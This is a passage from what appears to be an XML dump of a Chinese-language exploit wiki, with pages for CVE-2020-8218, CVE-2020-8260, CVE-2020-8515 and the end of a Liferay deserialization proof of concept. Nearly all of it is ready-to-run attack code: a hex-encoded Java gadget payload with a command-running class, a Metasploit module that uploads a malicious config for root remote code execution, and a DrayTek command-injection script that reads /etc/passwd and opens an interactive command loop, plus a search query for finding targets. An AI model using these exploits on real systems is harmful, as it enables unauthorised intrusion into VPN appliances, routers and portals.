       self.send_header('Content-type','application/java-vm')
       self.end_headers()
       f = open("LifExp.class", "rb")
       self.wfile.write(f.read())
       f.close()
       return

def log(level, msg):
   prefix = "[#] "
   if level == "error":
       prefix = "[!] "
   d = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
   temp = "{} [{}] {}".format(prefix, d, msg)
   print(temp)

def find_href(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.find_all('a', href=True)
   
def find_class(body, clazz):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("div", {"class": clazz})

def find_id(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("form", {"id": "execute"})

def get_param(div):
   param = ""
   param_type = ""
   p_name = div.find("span", {"class": "lfr-api-param-name"})
   p_type = div.find("span", {"class": "lfr-api-param-type"})
   if p_name:
       param = p_name.text.strip()
   if p_type:
       param_type = p_type.text.strip()
       
   return (param, param_type)

def _do_get(url):
   resp = requests.get(url, proxies=PROXIES, verify=False)
   return resp
   
def do_get(host, path):
   url = "{}/{}".format(host, path)
   resp = _do_get(url)
   return resp
   
def _do_post(url, data):
   resp = requests.post(url, proxies=PROXIES, verify=False, data=data)
   return resp
   
def do_post(host, path, data):
   url = "{}/{}".format(host, path)
   resp = _do_post(url, data)
   return resp
   
def find_endpoints(host, path):
   result = []
   resp = do_get(host, path)
   links = find_href(resp.text)
   for link in links:
       if "java.lang.Object" in link['href']:
           result.append(link['href'])
   return result

def find_parameters(body):
   div_params = find_class(body, "lfr-api-param")
   params = []
   for d in div_params:
       params.append(get_param(d))
   return params

def find_url(body):
   form = find_id(body)[0]
   return form['action']

def set_params(params, payload, payload_type):
   result = {}
   for param in params:
       p_name, p_type = param
       if p_type == "java.lang.Object":
           result[p_name+":"+payload_type] = payload
       
       result[p_name] = "1"
   return result

def pad(data, length):
   return data+"\x20"*(length-len(data))
   
def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE):
   p = set_params(params, PAYLOAD, PAYLOAD_TYPE)
   resp = do_post(host, api_url, p)

banner = """POC author: mzero\r\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research"""

def main():
   print(banner)
   parser = argparse.ArgumentParser()
   parser.add_argument("-t", "--target-host", dest="target", help="target host:port", required=True)
   parser.add_argument("-u", "--api-url", dest="api_url", help="path to jsonws. Default: /api/jsonws", default="api/jsonws")
   parser.add_argument("-p", "--bind-port", dest="bind_port", help="HTTP server bind port. Default 9091", default=9091)
   parser.add_argument("-l", "--bind-ip", dest="bind_ip", help="HTTP server bind IP. Default 127.0.0.1. It can't be 0.0.0.0", default="127.0.0.1")

   args = parser.parse_args()
   bind_port  = int(args.bind_port)
   bind_ip = args.bind_ip
   target_ip = args.target
   api_url = args.api_url
   endpoints = []
   vuln_endpoints = []
   
   PAYLOAD_TYPE = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
   PAYLOAD_PREFIX = """{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8"""
   PAYLOAD_SUFIX = """740003466f6f;"}"""

   INTERNAL = pad("http://{}:{}/".format(bind_ip, bind_port), 200)

   INTERNALB = INTERNAL.encode('utf-8')
   
   INTERNALHEX = binascii.hexlify(INTERNALB)

   PAYLOAD = PAYLOAD_PREFIX+INTERNALHEX.hex()+PAYLOAD_SUFIX
   
   
   try:
       log("info", "Looking for vulnerable endpoints: {}/{}".format(target_ip, api_url))
       endpoints = find_endpoints(target_ip, api_url)
       if not endpoints:
           log("info", "Vulnerable endpoints not found!")
           sys.exit(1)
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
   try:
       server = HTTPServer((bind_ip, bind_port), HttpHandler)
       log("info", "Started HTTP server on {}:{}".format(bind_ip, bind_port))
       th = threading.Thread(target=server.serve_forever)
       th.daemon=True
       th.start()
       
       for e in endpoints:
           resp = do_get(target_ip, e)
           params = find_parameters(resp.text)
           url_temp = find_url(resp.text)
           vuln_endpoints.append((url_temp, params))
       
       for endpoint in vuln_endpoints:
           log("info", "Probably vulnerable endpoint {}.".format(endpoint[0]))
           op = raw_input("Do you want to test it? Y/N: ")
           if op.lower() == "y":
               exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE)
               
       log("info", "CTRL+C to exit :)")
       while True:
           time.sleep(1)
   except KeyboardInterrupt:
       log("info", "Shutting down...")
       server.socket.close()
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
if __name__ == "__main__":
   main()

LifExp.java

public class LifExp {

static {
try {
String[] cmd = {"cmd.exe", "/c", "calc.exe"};
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
&lt;/pre&gt;</text>
      <sha1>d17h2aufafi7f4eykvg4mf17h85d0p7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8218 Pulse Secure VPN 安全認證RCE漏洞</title>
    <ns>0</ns>
    <id>5</id>
    <revision>
      <id>8</id>
      <timestamp>2021-02-26T06:33:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==利用代碼：== &lt;code&gt;https://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x="ls /",system$x); #' -e /data/runti…」的新頁面</comment>
      <origin>8</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="198" sha1="06tgcjm8hani5wpyeteeglsvp3rw277" xml:space="preserve">==利用代碼：==
&lt;code&gt;https://x.x.x.x/dana-admin/license/downloadlicenses.cgi?cmd=download&amp;txtVLSAuthCode=whatever -n '($x="ls /",system$x); #' -e /data/runtime/tmp/tt/setcookie.thtml.ttc&lt;/code&gt;</text>
      <sha1>06tgcjm8hani5wpyeteeglsvp3rw277</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8260 Pulse Secure VPN 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1364</id>
    <revision>
      <id>1715</id>
      <timestamp>2021-04-16T09:16:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##   class MetasploitModul..."</comment>
      <origin>1715</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10685" sha1="2v6cu5rrnqt3vp1mwoi4ps53ac8d9qb" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule &lt; Msf::Exploit::Remote
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
 
  ENCRYPTION_KEY = "\x7e\x95\x42\x1a\x6b\x88\x66\x41\x43\x1b\x32\xc5\x24\x42\xe2\xe4\x83\xf8\x1f\x58\xb0\xe9\xe9\xa5".b
 
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Pulse Secure VPN gzip RCE',
        'Description' =&gt; %q{
          The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability
          which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root.
          Admin credentials are required for successful exploitation.
          Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`.
        },
        'Author' =&gt; [
          'h00die', # msf module
          'Spencer McIntyre', # msf module
          'Richard Warren &lt;richard.warren@nccgroup.com&gt;', # original PoC, discovery
          'David Cash &lt;david.cash@nccgroup.com&gt;', # original PoC, discovery
        ],
        'References' =&gt; [
          ['URL', 'https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605'],
          ['URL', 'https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/'],
          ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601'],
          ['CVE', '2020-8260']
        ],
        'DisclosureDate' =&gt; '2020-10-26',
        'License' =&gt; MSF_LICENSE,
        'Platform' =&gt; ['unix', 'linux'],
        'Arch' =&gt; [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Privileged' =&gt; true,
        'Targets' =&gt; [
          [
            'Unix In-Memory',
            {
              'Platform' =&gt; 'unix',
              'Arch' =&gt; ARCH_CMD,
              'Type' =&gt; :unix_memory,
              'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/unix/generic' }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' =&gt; 'linux',
              'Arch' =&gt; [ARCH_X86, ARCH_X64],
              'Type' =&gt; :linux_dropper,
              'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x64/meterpreter_reverse_tcp' }
            }
          ]
        ],
        'Payload' =&gt; { 'Compat' =&gt; { 'ConnectionType' =&gt; '-bind' } },
        'DefaultOptions' =&gt; { 'RPORT' =&gt; 443, 'SSL' =&gt; true, 'CMDSTAGER::FLAVOR' =&gt; 'curl' },
        'DefaultTarget' =&gt; 1,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES],
          'RelatedModules' =&gt; ['auxiliary/gather/pulse_secure_file_disclosure']
        }
      )
    )
 
    register_options([
      OptString.new('TARGETURI', [true, 'The URI of the application', '/']),
      OptString.new('USERNAME', [true, 'The username to login with', 'admin']),
      OptString.new('PASSWORD', [true, 'The password to login with', '123456'])
    ])
 
    register_advanced_options([
      OptFloat.new('CMDSTAGER::DELAY', [ true, 'Delay between command executions', 1.5 ]),
    ])
  end
 
  def check(exploiting: false)
    login
    res = send_request_cgi({ 'uri' =&gt; normalize_uri('dana-admin', 'misc', 'admin.cgi') })
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless res&amp;.code == 200
    version = res.body.scan(%r{id="span_stats_counter_total_users_count"[^&gt;]+&gt;([^&lt;(]+)(?:\(build (\d+)\))?&lt;/span&gt;})&amp;.last
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the version information') unless version
    version, build = version
 
    return CheckCode::Unknown unless version.include?('R')
 
    version, revision = version.split('R', 2)
    print_status("Version #{version.strip}, revision #{revision.strip}, build #{build.strip} found")
    return CheckCode::Appears if version.to_f &lt;= 9.1 &amp;&amp; revision.to_f &lt; 9
 
    CheckCode::Detected
  rescue Msf::Exploit::Failed
    CheckCode::Unknown
  ensure
    logout unless exploiting
  end
 
  def exploit
    case (checkcode = check(exploiting: true))
    when Exploit::CheckCode::Vulnerable, Exploit::CheckCode::Appears
      print_good(checkcode.message)
    when Exploit::CheckCode::Detected
      print_warning(checkcode.message)
    else
      fail_with(Module::Failure::Unknown, checkcode.message.to_s)
    end
 
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(
        linemax: 262144, # 256KiB
        delay: datastore['CMDSTAGER::DELAY']
      )
    end
 
    logout
  end
 
  def execute_command(command, _opts = {})
    trigger = Rex::Text.rand_text_alpha_upper(8)
    print_status("Exploit trigger will be at #{normalize_uri('dana-na', 'auth', 'setcookie.cgi')} with a header of #{trigger}")
 
    config = build_malicious_config(command, trigger)
    res = upload_config(config)
 
    fail_with(Failure::UnexpectedReply, 'File upload failed') unless res&amp;.code == 200
 
    print_status('Triggering RCE')
    send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'dana-na', 'auth', 'setcookie.cgi'),
      'headers' =&gt; { trigger =&gt; trigger }
    })
  end
 
  def res_get_xsauth(res)
    res.body.scan(%r{name="xsauth" value="([^"]+)"/&gt;})&amp;.last&amp;.first
  end
 
  def upload_config(config)
    print_status('Requesting backup config page')
    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'config.cgi'),
      'headers' =&gt; { 'Referer' =&gt; "#{full_uri('/dana-admin/cached/config/config.cgi')}?type=system" },
      'vars_get' =&gt; { 'type' =&gt; 'system' }
    })
    fail_with(Failure::UnexpectedReply, 'Failed to request the backup configuration page') unless res&amp;.code == 200
    xsauth = res_get_xsauth(res)
    fail_with(Failure::UnexpectedReply, 'Failed to get the xsauth token') if xsauth.nil?
 
    post_data = Rex::MIME::Message.new
    post_data.add_part(xsauth, nil, nil, 'form-data; name="xsauth"')
    post_data.add_part('Import', nil, nil, 'form-data; name="op"')
    post_data.add_part('system', nil, nil, 'form-data; name="type"')
    post_data.add_part('8', nil, nil, 'form-data; name="optWhat"')
    post_data.add_part('', nil, nil, 'form-data; name="txtPassword1"')
    post_data.add_part('Import Config', nil, nil, 'form-data; name="btnUpload"')
    post_data.add_part(config, 'application/octet-stream', 'binary', 'form-data; name="uploaded_file"; filename="system.cfg"')
 
    print_status('Uploading encrypted config backup')
    send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'import.cgi'),
      'method' =&gt; 'POST',
      'headers' =&gt; { 'Referer' =&gt; "#{full_uri('/dana-admin/cached/config/config.cgi')}?type=system" },
      'data' =&gt; post_data.to_s,
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}"
    })
  end
 
  def login
    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),
      'method' =&gt; 'POST',
      'vars_post' =&gt; {
        'tz_offset' =&gt; '-300',
        'username' =&gt; datastore['USERNAME'],
        'password' =&gt; datastore['PASSWORD'],
        'realm' =&gt; 'Admin Users',
        'btnSubmit' =&gt; 'Sign In'
      },
      'keep_cookies' =&gt; true
    })
 
    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&amp;.code == 302
    location = res.headers['Location']
    fail_with(Failure::NoAccess, 'Login failed') if location.include?('failed')
 
    return unless location.include?('admin%2Dconfirm')
 
    # if the account we login with is already logged in, or another admin is logged in, a warning is displayed.  Click through it.
    print_status('Other admin sessions detected, continuing')
    res = send_request_cgi({ 'uri' =&gt; location, 'keep_cookies' =&gt; true })
    fail_with(Failure::UnexpectedReply, 'Login failed') unless res&amp;.code == 200
    fds = res.body.scan(/name="FormDataStr" value="([^"]+)"&gt;/).last
    xsauth = res_get_xsauth(res)
    fail_with(Failure::UnexpectedReply, 'Login failed (missing form elements)') unless fds &amp;&amp; xsauth
 
    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'dana-na', 'auth', 'url_admin', 'login.cgi'),
      'method' =&gt; 'POST',
      'vars_post' =&gt; {
        'btnContinue' =&gt; 'Continue the session',
        'FormDataStr' =&gt; fds.first,
        'xsauth' =&gt; xsauth
      },
      'keep_cookies' =&gt; true
    })
    fail_with(Failure::UnexpectedReply, 'Login failed') unless res
  end
 
  def logout
    print_status('Logging out to prevent warnings to other admins')
    res = send_request_cgi({ 'uri' =&gt; normalize_uri(target_uri.path, 'dana-admin', 'cached', 'config', 'config.cgi') })
    fail_with(Failure::UnexpectedReply, 'Logout failed') unless res&amp;.code == 200
 
    logout_uri = res.body.scan(%r{/dana-na/auth/logout\.cgi\?xsauth=\w+}).first
    fail_with(Failure::UnexpectedReply, 'Logout failed') if logout_uri.nil?
 
    res = send_request_cgi({ 'uri' =&gt; logout_uri })
    fail_with(Failure::UnexpectedReply, 'Logout failed') unless res&amp;.code == 302
  end
 
  def build_malicious_config(cmd, trigger)
    payload_script = "#{Rex::Text.rand_text_alphanumeric(rand(6..13))}.sh"
    perl = &lt;&lt;~PERL
      if (length $ENV{HTTP_#{trigger}}){
        chmod 0775, "/data/var/runtime/tmp/tt/#{payload_script}";
        system("env /data/var/runtime/tmp/tt/#{payload_script}");
      }
    PERL
    tarfile = StringIO.new
    Gem::Package::TarWriter.new(tarfile) do |tar|
      tar.mkdir('tmp', 509)
      tar.mkdir('tmp/tt', 509)
      tar.add_file('tmp/tt/setcookie.thtml.ttc', 511) do |tio|
        tio.write perl
      end
      tar.add_file("tmp/tt/#{payload_script}", 511) do |tio|
        tio.write "PATH=/home/bin:$PATH\n"
        tio.write "rm -- \"$0\"\n"
        tio.write cmd
      end
    end
 
    gzfile = StringIO.new
    gz = Zlib::GzipWriter.new(gzfile)
    gz.write(tarfile.string)
    gz.close
 
    encrypt_config(gzfile.string)
  end
 
  def encrypt_config(config_blob)
    cipher = OpenSSL::Cipher.new('DES-EDE3-CFB').encrypt
    iv = cipher.iv = cipher.random_iv
    cipher.key = ENCRYPTION_KEY
 
    md5 = OpenSSL::Digest.new('MD5', "#{iv}\x00#{[config_blob.length].pack('V')}")
 
    ciphertext = cipher.update(config_blob)
    ciphertext &lt;&lt; cipher.final
    md5 &lt;&lt; ciphertext
 
    cipher.reset
    "\x09#{iv}\x00#{[ciphertext.length].pack('V') + ciphertext + cipher.update(md5.digest) + cipher.final}"
  end
end
&lt;/pre&gt;</text>
      <sha1>2v6cu5rrnqt3vp1mwoi4ps53ac8d9qb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8515 DrayTek企業網絡設備 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>285</id>
    <revision>
      <id>438</id>
      <timestamp>2021-03-19T01:41:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Vigor2960 &lt; v1.5.1  Vigor300B &lt; v1.5.1  Vigor3900 &lt; v1.5.1  VigorSwitch20P2121 &lt;= v2.3.2  VigorSwitch20G1280 &lt;=..."</comment>
      <origin>438</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3594" sha1="puo7fcpz91ywg3veidq756dnias71yz" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Vigor2960 &lt; v1.5.1

Vigor300B &lt; v1.5.1

Vigor3900 &lt; v1.5.1

VigorSwitch20P2121 &lt;= v2.3.2

VigorSwitch20G1280 &lt;= v2.3.2

VigorSwitch20P1280 &lt;= v2.3.2

VigorSwitch20G2280 &lt;= v2.3.2

VigorSwitch20P2280 &lt;= v2.3.2
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Vigor 2960"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: DrayTek企业网络设备                                        \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         &gt;&gt;&gt; pwd                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&amp;keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&amp;loginUser=a&amp;loginPwd=a"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cmd)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        sys.exit(0)

def POC_2(target_url, Cmd):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    Cmd = Cmd.replace(' ','${IFS}')
    data = "action=login&amp;keyPath=%27%0A%2fbin%2f%26{}%0A%27&amp;loginUser=a&amp;loginPwd=a".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200:
            print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;</text>
      <sha1>puo7fcpz91ywg3veidq756dnias71yz</sha1>
    </revision>
    <revision>
      <id>439</id>
      <parentid>438</parentid>
      <timestamp>2021-03-19T01:41:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>439</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3605" sha1="6vay4qc1qamauyobrcypkxny3o3xaok" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Vigor2960 &lt; v1.5.1

Vigor300B &lt; v1.5.1

Vigor3900 &lt; v1.5.1

VigorSwitch20P2121 &lt;= v2.3.2

VigorSwitch20G1280 &lt;= v2.3.2

VigorSwitch20P1280 &lt;= v2.3.2

VigorSwitch20G2280 &lt;= v2.3.2

VigorSwitch20P2280 &lt;= v2.3.2
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Vigor 2960"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: DrayTek企业网络设备                                        \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         &gt;&gt;&gt; pwd                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&amp;keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&amp;loginUser=a&amp;loginPwd=a"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cmd)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        sys.exit(0)

def POC_2(target_url, Cmd):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    Cmd = Cmd.replace(' ','${IFS}')
    data = "action=login&amp;keyPath=%27%0A%2fbin%2f%26{}%0A%27&amp;loginUser=a&amp;loginPwd=a".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200:
            print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    POC_1(target_url)
&lt;/pre&gt;</text>
      <sha1>6vay4qc1qamauyobrcypkxny3o3xaok</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-8515 DrayTek企業網絡設備 遠程命令執行漏洞/en</title>
    <ns>0</ns>
    <id>5107</id>
    <revision>
      <id>5847</id>
      <timestamp>2021-06-24T02:57:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-8515 DrayTek Enterprise Network Device Remote Command Execution Vulnerability"</comment>
      <origin>5847</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3577" sha1="5ujvmw5li9nzjnr4f6e83epc8dbkbvo" xml:space="preserve">&lt;languages  /&gt;
==Vulnerability Impact==
&lt;pre&gt;
Vigor2960 &lt; v1.5.1

Vigor300B &lt; v1.5.1

Vigor3900 &lt; v1.5.1

VigorSwitch20P2121 &lt;= v2.3.2

VigorSwitch20G1280 &lt;= v2.3.2

VigorSwitch20P1280 &lt;= v2.3.2

VigorSwitch20G2280 &lt;= v2.3.2

VigorSwitch20P2280 &lt;= v2.3.2
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Vigor 2960"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: DrayTek企业网络设备                                        \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         &gt;&gt;&gt; pwd                                                \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    data = "action=login&amp;keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27&amp;loginUser=a&amp;loginPwd=a"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, Cmd)
        else:
            print("\033[31m[x] 不存在漏洞 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)
        sys.exit(0)

def POC_2(target_url, Cmd):
    vuln_url = target_url + "/cgi-bin/mainfunction.cgi"
    headers = {
